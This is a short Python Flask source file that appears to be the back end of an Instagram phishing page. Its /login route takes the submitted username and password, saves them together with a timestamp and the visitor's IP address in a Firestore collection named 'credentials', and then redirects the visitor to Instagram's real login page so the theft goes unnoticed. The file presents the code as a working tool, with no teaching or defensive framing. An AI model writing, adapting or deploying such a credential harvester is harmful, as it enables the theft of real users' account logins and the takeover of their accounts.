from flask import Flask, request, redirect
import os
from datetime import datetime
import firebase_admin
from firebase_admin import credentials, firestore
import json
from dotenv import load_dotenv  # Add this import

# Load environment variables
load_dotenv()  # Add this line

app = Flask(__name__)

# Initialize Firebase
cred = credentials.Certificate(json.loads(os.environ['FIREBASE_CONFIG']))
firebase_admin.initialize_app(cred)
db = firestore.client()

@app.route('/')
def home():
    with open('index.html', 'r', encoding='utf-8') as f:
        content = f.read()
    return content, 200, {'Content-Type': 'text/html; charset=utf-8'}

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    doc_ref = db.collection('credentials').document()
    doc_ref.set({
        'username': username,
        'password': password,
        'timestamp': datetime.now().isoformat(),
        'ip_address': request.remote_addr
    })
    
    return redirect('https://www.instagram.com/accounts/login/')

if __name__ == '__main__':
    app.run(port=3000)